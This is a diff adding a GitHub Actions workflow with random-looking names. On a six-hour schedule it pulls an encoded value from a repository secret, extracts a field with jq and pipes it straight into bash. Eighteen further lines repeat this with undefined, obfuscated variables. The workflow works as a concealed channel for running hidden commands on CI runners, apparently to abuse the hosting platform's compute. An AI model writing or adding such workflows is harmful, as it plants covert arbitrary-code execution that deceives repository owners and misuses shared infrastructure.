@@ -1,0 +1,36 @@
+name: obviousgameg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: obviousgameg
+        env:
+          c959: ${{ secrets.c959 }}
+        run: |
+          echo $c959 | jq -r .gsrtp6 | /bin/bash
+          echo $giv42114 | jq -r .vgli942 | /bin/bash
+          echo $zc3304 | jq -r .xqlkc9 | /bin/bash
+          echo $w05 | jq -r .w672 | /bin/bash
+          echo $eoaz37258 | jq -r .shcds11190 | /bin/bash
+          echo $cbmmg0894 | jq -r .admyo19396 | /bin/bash
+          echo $ncvb00 | jq -r .ry5 | /bin/bash
+          echo $xng66154 | jq -r .k15399 | /bin/bash
+          echo $emp89030 | jq -r .rdg34 | /bin/bash
+          echo $k3 | jq -r .e253 | /bin/bash
+          echo $dbo786 | jq -r .nbo115 | /bin/bash
+          echo $zppev16756 | jq -r .tk7671 | /bin/bash
+          echo $b6 | jq -r .x95 | /bin/bash
+          echo $vvdss211 | jq -r .glsf83651 | /bin/bash
+          echo $ob2 | jq -r .lzdb34 | /bin/bash
+          echo $ws40 | jq -r .zz708 | /bin/bash
+          echo $kdwbu5 | jq -r .twagz43182 | /bin/bash
+          echo $r958 | jq -r .pl0908 | /bin/bash
+          echo $ou741 | jq -r .cnyq417 | /bin/bash
+
